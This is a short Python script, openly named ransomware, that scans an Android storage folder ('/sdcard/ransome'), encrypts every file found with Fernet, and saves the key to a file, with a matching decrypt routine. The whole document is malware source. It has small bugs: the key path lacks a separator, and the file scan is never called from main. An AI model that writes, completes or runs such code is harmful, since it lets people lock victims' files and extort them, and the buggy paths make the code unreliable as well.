import os
import sys
from cryptography.fernet import Fernet

dirr = "/sdcard/ransome"
files = []
key = Fernet.generate_key()

def scan_recurse(base_dir):
    try:
        for entry in os.scandir(base_dir):
            if entry.is_file():
                yield entry
            else:
                yield from scan_recurse(entry.path)
    except Exception as e:
        return str(e)

def scan_files():
    try:
        for i in scan_recurse(dirr):
            if 'key.key' in i.path:
                continue
            files.append(i.path)
        return f"{len(files)}"
    except Exception as e:
        return f"Exception: {e}"

class Ransomware:
    def __init__(self):
        pass

    def backup_key(self):
        try:
            key_path = dirr + 'key.key'
            with open(key_path, 'wb') as key_file:
                key_file.write(key)
            print("Encryption key backed up to 'key.key'.")
        except IOError as e:
            print("Error backing up key: ", e)

    def encrypt(self):
        for file in files:
            if not os.path.isfile(file):
                print(f"{file} not found or is not a file, skipping.")
                continue
            try:
                with open(file, 'rb') as file_data:
                    data = file_data.read()
                encrypted_data = Fernet(key).encrypt(data)
                print(f'Encrypted: {file}')
                with open(file, 'wb') as file_data:
                    file_data.write(encrypted_data)
            except Exception as e:
                print(f"Error encrypting {file}: {e}")

    def decrypt(self):
        with open("/storage/emulated/0/ransome/key.key") as f:
            key = f.read()
        if not key:
            key = "key is nil."
        for file in files:
            if not os.path.isfile(file):
                print(f"{file} not found or is not a file, skipping.")
                continue
            try:
                with open(file, 'rb') as file_data:
                    data = file_data.read()
                decrypted_data = Fernet(key).decrypt(data)
                print(f'Decrypted: {file}')
                with open(file,'wb') as file_data:
                    file_data.write(decrypted_data)
            except Exception as e:
                print(f"Error decrypting {file}: {e}")


def main():
    if not files:
        print("No files found to encrypt.")
    else:
        ransomware = Ransomware()
        if os.path.exists('/storage/emulated/0/ransome/key.key'):			
            ransomware.decrypt()
        else:
            ransomware.backup_key()
            ransomware.encrypt()
    return "Done."

